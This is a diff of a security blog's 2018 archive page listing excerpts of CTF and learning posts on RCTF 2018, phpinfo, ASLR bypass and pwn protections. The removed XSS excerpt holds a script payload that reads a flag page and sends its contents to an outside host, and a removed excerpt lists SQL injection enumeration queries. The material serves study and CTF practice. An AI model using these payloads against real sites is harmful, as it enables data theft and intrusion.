@@ -341,6 +341,138 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href="/posts/9764/">
+            
+                <span>rctf2018学习笔记</span>
+        </a>
+        <div class="abstract-content">
+            Web赛后总结
+r-cursive源代码:
+1234567891011121314151617&lt;?php$token = sha1($_SERVER[&apos;REMOTE_ADDR&apos;]);$dir = &apos;../sandbox/&apos;.$token.&apos;/&apos;;is_dir($dir) ?: mkdir($dir);is_file($dir.&apos;index.php&apos;) ?: file_put_contents($dir.&apos;index.php&apos;, str_replace(&apos;#SHA1#&apo...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/22</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/23527/">
+            
+                <span>phpinfo解读</span>
+        </a>
+        <div class="abstract-content">
+            phpinfo解读我们以 链接：phpinfo() 为例来讲解吧。
+版本更迭phpinfo里最显眼的信息，也就是其标题（图1），其中包含PHP的版本信息。 PHP 5.6 是官方最后一个支持的PHP 5版本，不过，这个版本也已经于2017年1月19号停止功能性更新，只提供安全更新。到2018年12月31号为止，PHP 5.6也将完全终止更新，PHP5彻底退出历史舞台。
+ PHP7里提供了很多更好用的语法、函数，也极大改进了安全性。举几个简单的例子：
+
+移除不支持SQL预编译的Mysql扩展：mysql 
+移除preg_replace中容易导致代码执行漏洞的正则模式：e 
+assert从一...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/22</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/32791/">
+            
+                <span>bypassaslr_1</span>
+        </a>
+        <div class="abstract-content">
+            绕过ASLR–return2plt编译代码
+源代码
+
+12345678910111213141516#include&lt;stdio.h&gt;#include &lt;string.h&gt;/* Eventhough shell() function isnt invoked directly, its needed   here since 'system@PLT' and 'exit@PLT' stub code should be pres   ent in executable to successfully exploit it. */void shell() &#123...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/21</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/53269/">
+            
+                <span>pwn备忘录</span>
+        </a>
+        <div class="abstract-content">
+            checksec检测到的保护机制
+cannary  (栈保护)
+栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 
+gcc选项: 
+
+gcc4.2版本-fstack-protector和-fsta...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/09</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href="/posts/62655/">
             
                 <span>cbc翻转</span>
@@ -552,146 +684,10 @@ d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0...
         </div>
     </article>
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/52452/">
-            
-                <span>xss</span>
-        </a>
-        <div class="abstract-content">
-            link 标签引入外部 js。
-12也可以用域名，将 . 用 。 代替。&lt;link rel=import href=\\八进制ip
-1234567&lt;script&gt;  var xhr = new XMLHttpRequest();  xhr.open("GET", "https://router.vip/flag.php", false);  xhr.send();  a=xhr.responseText;  location.href='https://master.xbfzss.cn/?a='+escape(a);&lt;/script&gt;
-xss:jquery版...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/27</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/24854/">
-            
-                <span>url相对路径和绝对路径</span>
-        </a>
-        <div class="abstract-content">
-            jquery.min.js的绝对路径:
-1http://39.107.33.96:20000/static/js/jquery.min.js
-当前url: http://39.107.33.96:20000/index.php/view/
-html中引入jquery.min.js,相对路径:1&lt;script src=&quot;../static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
-此时: 浏览器解析js的路径:1http://39.107.33.96:20000/index.php/static/js/jquery.min.js  ...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/27</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="前端">前端</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/40688/">
-            
-                <span>python3和python2 base64的问题</span>
-        </a>
-        <div class="abstract-content">
-            首先我们来看两段代码：
-python2.7:
-12345text = 'system'text1 = ''for i in text:    text1 += chr(ord(i) +10)print base64.b64encode(text1)
-结果:
-1fYN9fm93
-python3.5:
-12345text = &apos;system&apos;text1 = &apos;&apos;for i in text:    text1 += (chr(ord(i) +10))print(base64.b64encode(str.encode(text1)))
-结果:
-1b&apo...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/26</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="python">python</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/41083/">
-            
-                <span>sql注入大全</span>
-        </a>
-        <div class="abstract-content">
-            通用注入语句:
-表名
-
-1select group_concat(distinct table_name) from information_schema.tables where table_schema=database()
-
-列名
-
-1select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]
-
-数据库
-
-1select group_concat(schema_name) from information_schema.s...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/21</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
     <!-- paginator  -->
     
     <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/archives/2018/page/3/">&#60; PREV</a><a class="page-number" href="/archives/2018/">1</a><a class="page-number" href="/archives/2018/page/2/">2</a><a class="page-number" href="/archives/2018/page/3/">3</a><span class="page-number current">4</span>
+        <a class="extend prev" rel="prev" href="/archives/2018/page/3/">&#60; PREV</a><a class="page-number" href="/archives/2018/">1</a><a class="page-number" href="/archives/2018/page/2/">2</a><a class="page-number" href="/archives/2018/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/archives/2018/page/5/">5</a><a class="extend next" rel="next" href="/archives/2018/page/5/">NEXT &#62;</a>
     </nav>
     
 </main>
@@ -1366,9 +1362,101 @@ python3.5:
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 40
+        Total : 44
         </div>
         <!-- search  -->
         
@@ -1381,6 +1469,26 @@ python3.5:
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href="/posts/18428/">lamp && lnmp以apt-get的方式安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/04</span><a class="archive-post-title" href="/posts/7418/">WEBSEC-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/posts/42614/">TokyoWesterns CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">awd准备工作</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1594,6 +1702,8 @@ python3.5:
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
